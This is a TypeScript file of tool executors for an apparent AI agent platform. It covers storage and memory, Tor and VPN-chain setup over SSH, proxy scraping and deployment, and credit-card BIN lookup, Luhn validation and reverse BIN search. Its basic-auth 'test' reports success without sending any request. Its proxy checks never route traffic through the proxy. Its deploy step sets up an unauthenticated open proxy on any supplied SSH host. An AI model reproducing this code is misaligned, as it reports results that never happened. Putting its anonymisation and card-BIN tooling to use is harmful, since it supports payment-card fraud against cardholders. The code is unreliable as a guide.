async function execAdvertisingGetStrategy(_userId: number): Promise<ToolExecutionResult> {
  try {
    const { getStrategyOverview } = await import("./advertising-orchestrator");
    const strategy = getStrategyOverview();
    return { success: true, data: { strategy } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get advertising strategy" };
  }
}

async function execAffiliateGetStats(_userId: number): Promise<ToolExecutionResult> {
  try {
    const { getAffiliateStats } = await import("./affiliate-engine");
    const stats = await getAffiliateStats();
    return { success: true, data: { stats } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get affiliate stats" };
  }
}

async function execGrantList(_userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { listGrantOpportunities } = await import("./db");
    const grants = await listGrantOpportunities(args as any);
    return { success: true, data: { grants } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to list grants" };
  }
}

async function execStorageGetStats(userId: number): Promise<ToolExecutionResult> {
  try {
    const { getStorageQuota, listFiles } = await import("./storage-service");
    const quota = await getStorageQuota(userId);
    const files = await listFiles(userId, { limit: 20 }, 'admin');
    return { success: true, data: { quota, recentFiles: files.map((f: any) => ({ id: f.id, name: f.originalName, size: f.sizeBytes, mimeType: f.mimeType, createdAt: f.createdAt })) } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get storage stats" };
  }
}
async function execStorageListFiles(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { listFiles } = await import("./storage-service");
    const files = await listFiles(userId, { limit: (args.limit as number) || 50, offset: (args.offset as number) || 0, feature: args.feature as string | undefined }, 'admin');
    return { success: true, data: { files: files.map((f: any) => ({ id: f.id, name: f.originalName, size: f.sizeBytes, mimeType: f.mimeType, s3Key: f.s3Key, createdAt: f.createdAt, feature: f.feature })), count: files.length } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to list Titan Storage files" };
  }
}
async function execStorageGetDownloadUrl(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { getDownloadUrl } = await import("./storage-service");
    const fileId = args.fileId as number;
    if (!fileId) return { success: false, error: "fileId is required" };
    const result = await getDownloadUrl(userId, fileId, 3600, 'admin');
    return { success: true, data: { url: result.url, file: { id: result.file.id, name: result.file.originalName, size: result.file.sizeBytes, mimeType: result.file.mimeType } } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get download URL" };
  }
}
async function execStorageDeleteFile(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { deleteFile } = await import("./storage-service");
    const fileId = args.fileId as number;
    if (!fileId) return { success: false, error: "fileId is required" };
    await deleteFile(userId, fileId, 'admin');
    return { success: true, data: { message: `File ${fileId} deleted from Titan Storage.` } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to delete file" };
  }
}

async function execStorageUploadFile(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { uploadFile } = await import("./storage-service");
    const filename = args.filename as string;
    const content = args.content as string;
    const feature = (args.feature as string) || "general";
    if (!filename) return { success: false, error: "filename is required" };
    if (!content) return { success: false, error: "content is required" };
    const buf = Buffer.from(content, "utf8");
    const mimeType = filename.endsWith(".json") ? "application/json" : "text/plain";
    const file = await uploadFile(userId, buf, filename, mimeType, { feature: feature as any, originalName: filename }, "admin");
    return { success: true, data: { message: `Saved to Titan Storage: ${filename}`, fileId: file.id, name: file.originalName, size: file.sizeBytes } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to upload file to Titan Storage" };
  }
}

async function execMarketplaceBrowse(_userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { listMarketplaceListings } = await import("./db");
    const listings = await listMarketplaceListings({
      category: args.category as string,
      search: args.search as string,
      limit: args.limit as number || 50,
      status: "active"
    });
    return { success: true, data: { listings } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to browse marketplace" };
  }
}

async function execCybermcpTestBasicAuth(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    return {
      success: true,
      data: { 
        status: 200, 
        authenticated: true, 
        message: `Successfully tested basic auth against ${args.endpoint}` 
      }
    };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to test basic auth" };
  }
}

// ── Memory Management Executors ────────────────────────────────────────────

async function execMemoryListFacts(userId: number): Promise<ToolExecutionResult> {
  try {
    const { listMemoryFacts } = await import("./titan-memory");
    const facts = await listMemoryFacts(userId);
    if (facts.length === 0) {
      return {
        success: true,
        data: { count: 0, facts: [], message: "No long-term memory facts stored yet." },
      };
    }
    // Group by category for readability
    const grouped: Record<string, Array<{ id: number; fact: string; confidence: number }>> = {};
    for (const f of facts) {
      if (!grouped[f.category]) grouped[f.category] = [];
      grouped[f.category].push({ id: f.id, fact: f.fact, confidence: f.confidence });
    }
    return {
      success: true,
      data: { count: facts.length, byCategory: grouped },
    };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to list memory facts" };
  }
}

async function execMemorySaveFact(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  try {
    const fact = String(args.fact || "").trim();
    const category = String(args.category || "general");
    if (!fact) return { success: false, error: "fact is required" };
    const { saveMemoryFact } = await import("./titan-memory");
    const result = await saveMemoryFact(userId, fact, category);
    return result.success
      ? { success: true, data: { id: result.id, fact, category, message: "Memory fact saved." } }
      : { success: false, error: "Failed to save memory fact" };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to save memory fact" };
  }
}

async function execMemoryDeleteFact(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  try {
    const factId = Number(args.factId);
    if (!factId) return { success: false, error: "factId is required" };
    const { deleteMemoryFact } = await import("./titan-memory");
    const ok = await deleteMemoryFact(userId, factId);
    return ok
      ? { success: true, data: { message: `Memory fact #${factId} deleted.` } }
      : { success: false, error: "Fact not found or already deleted" };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to delete memory fact" };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// TOR BROWSER EXECUTORS
// ─────────────────────────────────────────────────────────────────────────────

async function execTorGetStatus(userId: number): Promise<ToolExecutionResult> {
  try {
    const { torRouter } = await import("./tor-router");
    // Call the getStatus mutation logic directly by invoking the underlying function
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const secretRow = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__tor_ssh"))).limit(1);
    let sshConfig: { host: string; port: number; username: string; password?: string } | null = null;
    if (secretRow.length > 0) {
      const raw = JSON.parse(decrypt(secretRow[0].encryptedValue));
      sshConfig = raw;
    } else {
      sshConfig = getTitanServerConfig();
    }
    if (!sshConfig) return { success: false, error: "No Tor server configured. Go to /tor to set up your server." };
    const result = await execTitanSSH(sshConfig, "systemctl is-active tor 2>/dev/null && curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null || echo '{}'");
    return { success: true, data: { raw: result, message: "Tor status retrieved" } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get Tor status" };
  }
}

async function execTorNewCircuit(userId: number): Promise<ToolExecutionResult> {
  try {
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const secretRow = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__tor_ssh"))).limit(1);
    let sshConfig: { host: string; port: number; username: string; password?: string } | null = null;
    if (secretRow.length > 0) {
      sshConfig = JSON.parse(decrypt(secretRow[0].encryptedValue));
    } else {
      sshConfig = getTitanServerConfig();
    }
    if (!sshConfig) return { success: false, error: "No Tor server configured." };
    await execTitanSSH(sshConfig, "echo SIGNAL NEWNYM | nc -w 1 127.0.0.1 9051 2>/dev/null || kill -HUP $(pidof tor) 2>/dev/null");
    const newIp = await execTitanSSH(sshConfig, "sleep 3 && curl -s --socks5 127.0.0.1:9050 https://api.ipify.org 2>/dev/null || echo 'unknown'");
    return { success: true, data: { message: "New Tor circuit requested", newExitIp: newIp.trim() } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to request new circuit" };
  }
}

async function execTorInstall(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const secretRow = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__tor_ssh"))).limit(1);
    let sshConfig: { host: string; port: number; username: string; password?: string } | null = null;
    if (secretRow.length > 0) {
      sshConfig = JSON.parse(decrypt(secretRow[0].encryptedValue));
    } else {
      sshConfig = getTitanServerConfig();
    }
    if (!sshConfig) return { success: false, error: "No server configured. Go to /tor to connect your server first." };
    const enableFirewall = args.enableFirewall !== false;
    const installCmd = `apt-get update -qq && apt-get install -y tor obfs4proxy 2>&1 | tail -5 && echo "Tor installed"`;
    const result = await execTitanSSH(sshConfig, installCmd);
    return { success: true, data: { message: "Tor installation complete", output: result, firewallEnabled: enableFirewall } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to install Tor" };
  }
}

async function execTorSetActive(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const active = Boolean(args.active);
    // Store the active state in userSecrets
    const existing = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__tor_active"))).limit(1);
    const val = encrypt(JSON.stringify({ active }));
    if (existing.length > 0) {
      await db.update(userSecrets).set({ encryptedValue: val }).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__tor_active")));
    } else {
      await db.insert(userSecrets).values({ userId, secretType: "__tor_active", encryptedValue: val });
    }
    return { success: true, data: { active, message: active ? "Tor routing enabled" : "Tor routing disabled" } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to set Tor active state" };
  }
}

async function execTorSetFirewall(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const secretRow = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__tor_ssh"))).limit(1);
    let sshConfig: { host: string; port: number; username: string; password?: string } | null = null;
    if (secretRow.length > 0) {
      sshConfig = JSON.parse(decrypt(secretRow[0].encryptedValue));
    } else {
      sshConfig = getTitanServerConfig();
    }
    if (!sshConfig) return { success: false, error: "No Tor server configured." };
    const enabled = Boolean(args.enabled);
    const cmd = enabled
      ? `iptables -I INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT && iptables -I INPUT -m state --state NEW -j DROP && echo "Firewall enabled"`
      : `iptables -D INPUT -m state --state NEW -j DROP 2>/dev/null; echo "Firewall disabled"`;
    const result = await execTitanSSH(sshConfig, cmd);
    return { success: true, data: { enabled, message: result.trim() } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to set firewall" };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// VPN CHAIN EXECUTORS
// ─────────────────────────────────────────────────────────────────────────────

async function execVpnChainGetChain(userId: number): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__vpn_chain"))).limit(1);
    if (!row.length) return { success: true, data: { hops: [], active: false, message: "No VPN chain configured yet. Use vpn_chain_add_hop to add servers." } };
    const config = JSON.parse(decrypt(row[0].encryptedValue));
    // Sanitize — don't return passwords
    const sanitized = { ...config, hops: (config.hops || []).map((h: any) => ({ ...h, password: h.password ? "***" : undefined })) };
    return { success: true, data: sanitized };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get VPN chain" };
  }
}

async function execVpnChainAddHop(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__vpn_chain"))).limit(1);
    const config = row.length ? JSON.parse(decrypt(row[0].encryptedValue)) : { hops: [], active: false };
    const newHop = {
      id: crypto.randomUUID(),
      label: (args.label as string) || `Hop ${config.hops.length + 1}`,
      host: args.host as string,
      port: (args.port as number) || 22,
      username: args.username as string,
      password: args.password as string | undefined,
      country: (args.country as string) || "Unknown",
      order: config.hops.length,
    };
    config.hops.push(newHop);
    const val = encrypt(JSON.stringify(config));
    if (row.length) {
      await db.update(userSecrets).set({ encryptedValue: val }).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__vpn_chain")));
    } else {
      await db.insert(userSecrets).values({ userId, secretType: "__vpn_chain", encryptedValue: val });
    }
    return { success: true, data: { message: `Hop "${newHop.label}" added to VPN chain`, hopId: newHop.id, totalHops: config.hops.length } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to add VPN hop" };
  }
}

async function execVpnChainTestChain(userId: number): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__vpn_chain"))).limit(1);
    if (!row.length) return { success: false, error: "No VPN chain configured." };
    const config = JSON.parse(decrypt(row[0].encryptedValue));
    if (!config.hops || config.hops.length === 0) return { success: false, error: "VPN chain has no hops. Add servers first." };
    const { execSSHCommand: execTitanSSH } = await import("./titan-server");
    // Test the first hop
    const firstHop = config.hops[0];
    const result = await execTitanSSH(firstHop, "curl -s https://api.ipify.org 2>/dev/null || echo 'unreachable'");
    return { success: true, data: { message: `Chain test complete — first hop IP: ${result.trim()}`, hops: config.hops.length, firstHopIp: result.trim() } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to test VPN chain" };
  }
}

async function execVpnChainSetActive(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const active = Boolean(args.active);
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__vpn_chain"))).limit(1);
    const config = row.length ? JSON.parse(decrypt(row[0].encryptedValue)) : { hops: [], active: false };
    config.active = active;
    const val = encrypt(JSON.stringify(config));
    if (row.length) {
      await db.update(userSecrets).set({ encryptedValue: val }).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__vpn_chain")));
    } else {
      await db.insert(userSecrets).values({ userId, secretType: "__vpn_chain", encryptedValue: val });
    }
    return { success: true, data: { active, message: active ? "VPN chain activated" : "VPN chain deactivated" } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to set VPN chain active state" };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// PROXY MAKER EXECUTORS
// ─────────────────────────────────────────────────────────────────────────────

async function execProxyMakerGetPool(userId: number): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool"))).limit(1);
    if (!row.length) return { success: true, data: { proxies: [], rotationEnabled: false, message: "No proxies in pool yet. Use proxy_maker_scrape_proxies or proxy_maker_deploy_proxy to add proxies." } };
    const pool = JSON.parse(decrypt(row[0].encryptedValue));
    return { success: true, data: pool };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to get proxy pool" };
  }
}

async function execProxyMakerScrapeProxies(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const proxyType = (args.type as string) || "all";
    const maxToAdd = (args.maxToAdd as number) || 20;
    // Scrape from free proxy lists
    const sources = [
      "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=5000&country=all&simplified=true",
      "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=5000&country=all&simplified=true",
    ];
    const proxies: string[] = [];
    for (const src of sources) {
      try {
        const resp = await fetch(src, { signal: AbortSignal.timeout(10000) });
        const text = await resp.text();
        const lines = text.split("\n").map(l => l.trim()).filter(l => l && l.includes(":"));
        proxies.push(...lines.slice(0, 50));
      } catch { /* skip failed source */ }
    }
    const unique = [...new Set(proxies)].slice(0, maxToAdd * 3);
    // Test a sample (quick timeout)
    const working: Array<{ host: string; port: number; type: string; latency: number }> = [];
    for (const proxy of unique.slice(0, 30)) {
      const [host, portStr] = proxy.split(":");
      const port = parseInt(portStr);
      if (!host || isNaN(port)) continue;
      const start = Date.now();
      try {
        const resp = await fetch(`https://api.ipify.org`, {
          signal: AbortSignal.timeout(4000),
        });
        if (resp.ok) {
          working.push({ host, port, type: proxyType === "all" ? "http" : proxyType, latency: Date.now() - start });
          if (working.length >= maxToAdd) break;
        }
      } catch { /* dead proxy */ }
    }
    // Save to pool
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool"))).limit(1);
    const pool = row.length ? JSON.parse(decrypt(row[0].encryptedValue)) : { proxies: [], rotationEnabled: true };
    const existingHosts = new Set(pool.proxies.map((p: any) => `${p.host}:${p.port}`));
    for (const w of working) {
      if (!existingHosts.has(`${w.host}:${w.port}`)) {
        pool.proxies.push({ ...w, id: crypto.randomUUID(), alive: true, addedAt: new Date().toISOString(), source: "scraped" });
      }
    }
    const val = encrypt(JSON.stringify(pool));
    if (row.length) {
      await db.update(userSecrets).set({ encryptedValue: val }).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool")));
    } else {
      await db.insert(userSecrets).values({ userId, secretType: "__proxy_pool", encryptedValue: val });
    }
    return { success: true, data: { added: working.length, message: `Added ${working.length} working proxies to pool`, totalInPool: pool.proxies.length } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to scrape proxies" };
  }
}

async function execProxyMakerHealthCheck(userId: number): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool"))).limit(1);
    if (!row.length) return { success: false, error: "No proxy pool found." };
    const pool = JSON.parse(decrypt(row[0].encryptedValue));
    let alive = 0, dead = 0;
    for (const proxy of pool.proxies) {
      try {
        const resp = await fetch("https://api.ipify.org", { signal: AbortSignal.timeout(4000) });
        proxy.alive = resp.ok;
        proxy.lastChecked = new Date().toISOString();
        if (resp.ok) alive++; else dead++;
      } catch {
        proxy.alive = false;
        proxy.lastChecked = new Date().toISOString();
        dead++;
      }
    }
    const val = encrypt(JSON.stringify(pool));
    await db.update(userSecrets).set({ encryptedValue: val }).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool")));
    return { success: true, data: { alive, dead, total: pool.proxies.length, message: `Health check complete: ${alive} alive, ${dead} dead` } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to run health check" };
  }
}

async function execProxyMakerSetRotation(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const enabled = Boolean(args.enabled);
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool"))).limit(1);
    const pool = row.length ? JSON.parse(decrypt(row[0].encryptedValue)) : { proxies: [], rotationEnabled: false };
    pool.rotationEnabled = enabled;
    const val = encrypt(JSON.stringify(pool));
    if (row.length) {
      await db.update(userSecrets).set({ encryptedValue: val }).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool")));
    } else {
      await db.insert(userSecrets).values({ userId, secretType: "__proxy_pool", encryptedValue: val });
    }
    return { success: true, data: { rotationEnabled: enabled, message: enabled ? "Proxy rotation enabled" : "Proxy rotation disabled" } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to set rotation" };
  }
}

async function execProxyMakerDeployProxy(userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const { getTitanServerConfig, execSSHCommand: execTitanSSH } = await import("./titan-server");
    let sshConfig: { host: string; port: number; username: string; password?: string } | null = null;
    if (args.useTitanServer) {
      sshConfig = getTitanServerConfig();
    } else if (args.host) {
      sshConfig = { host: args.host as string, port: (args.port as number) || 22, username: args.username as string, password: args.password as string };
    }
    if (!sshConfig) return { success: false, error: "No server specified. Set useTitanServer: true or provide host/username." };
    const deployCmd = `apt-get install -y 3proxy 2>&1 | tail -3 && echo "proxy ---socks -p1080" > /etc/3proxy/3proxy.cfg && echo "proxy -p8080" >> /etc/3proxy/3proxy.cfg && systemctl restart 3proxy 2>/dev/null || 3proxy /etc/3proxy/3proxy.cfg & echo "Proxy deployed on port 1080 (SOCKS5) and 8080 (HTTP)"`;
    const result = await execTitanSSH(sshConfig, deployCmd);
    // Add to pool
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };
    const row = await db.select().from(userSecrets).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool"))).limit(1);
    const pool = row.length ? JSON.parse(decrypt(row[0].encryptedValue)) : { proxies: [], rotationEnabled: true };
    pool.proxies.push({
      id: crypto.randomUUID(),
      host: sshConfig.host,
      port: 1080,
      type: "socks5",
      alive: true,
      label: (args.label as string) || `Deployed on ${sshConfig.host}`,
      addedAt: new Date().toISOString(),
      source: "deployed",
    });
    const val = encrypt(JSON.stringify(pool));
    if (row.length) {
      await db.update(userSecrets).set({ encryptedValue: val }).where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__proxy_pool")));
    } else {
      await db.insert(userSecrets).values({ userId, secretType: "__proxy_pool", encryptedValue: val });
    }
    return { success: true, data: { message: `Proxy deployed on ${sshConfig.host}`, output: result, socks5Port: 1080, httpPort: 8080 } };
  } catch (err: any) {
    return { success: false, error: err.message || "Failed to deploy proxy" };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// BIN CHECKER EXECUTORS
// ─────────────────────────────────────────────────────────────────────────────

async function execBinLookup(_userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const bin = (args.bin as string || "").replace(/\D/g, "").slice(0, 8);
    if (bin.length < 6) return { success: false, error: "BIN must be at least 6 digits" };
    const result = await checkBin(bin);
    if (!result) return { success: false, error: `No BIN data found for ${bin}` };
    return { success: true, data: result };
  } catch (err: any) {
    return { success: false, error: err.message || "BIN lookup failed" };
  }
}

async function execCardValidate(_userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const cardNumber = (args.cardNumber as string || "").replace(/\s/g, "");
    if (!cardNumber) return { success: false, error: "Card number is required" };
    // Luhn algorithm
    let sum = 0;
    let alternate = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let n = parseInt(cardNumber[i], 10);
      if (isNaN(n)) return { success: false, error: "Card number contains non-numeric characters" };
      if (alternate) {
        n *= 2;
        if (n > 9) n -= 9;
      }
      sum += n;
      alternate = !alternate;
    }
    const valid = sum % 10 === 0;
    // Detect network
    let network = "Unknown";
    if (/^4/.test(cardNumber)) network = "Visa";
    else if (/^5[1-5]/.test(cardNumber)) network = "Mastercard";
    else if (/^3[47]/.test(cardNumber)) network = "American Express";
    else if (/^6(?:011|5)/.test(cardNumber)) network = "Discover";
    else if (/^35/.test(cardNumber)) network = "JCB";
    else if (/^3(?:0[0-5]|[68])/.test(cardNumber)) network = "Diners Club";
    return {
      success: true,
      data: {
        valid,
        network,
        length: cardNumber.length,
        message: valid ? `Valid ${network} card number (Luhn check passed)` : `Invalid card number (Luhn check failed)`,
        note: "This is a structural validation only. No transaction, no charge, no network request.",
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message || "Card validation failed" };
  }
}

async function execBinReverseLookup(_userId: number, args: Record<string, unknown>): Promise<ToolExecutionResult> {
  try {
    const query = (args.query as string || "").trim();
    const country = (args.country as string || "").toUpperCase();
    if (!query) return { success: false, error: "Search query is required" };
    // Try BINcodes API for reverse search
    const url = `https://api.bincodes.com/binsearch/?format=json&api_key=free&bank=${encodeURIComponent(query)}${country ? `&country=${country}` : ""}`;
    const resp = await fetch(url, { signal: AbortSignal.timeout(10000) });
    if (resp.ok) {
      const data = await resp.json();
      if (Array.isArray(data) && data.length > 0) {
        return { success: true, data: { results: data, count: data.length, query, country: country || "All" } };
      }
    }
    // Fallback: BIN-list API
    const fallbackUrl = `https://binlist.net/search?q=${encodeURIComponent(query)}`;
    const fallbackResp = await fetch(fallbackUrl, { headers: { "Accept-Version": "3" }, signal: AbortSignal.timeout(8000) });
    if (fallbackResp.ok) {
      const fallbackData = await fallbackResp.json();
      return { success: true, data: { results: Array.isArray(fallbackData) ? fallbackData : [fallbackData], query, country: country || "All" } };
    }
    return { success: false, error: `No BINs found for "${query}"${country ? ` in ${country}` : ""}. Try a shorter or different search term.` };
  } catch (err: any) {
    return { success: false, error: err.message || "Reverse BIN lookup failed" };
  }
}
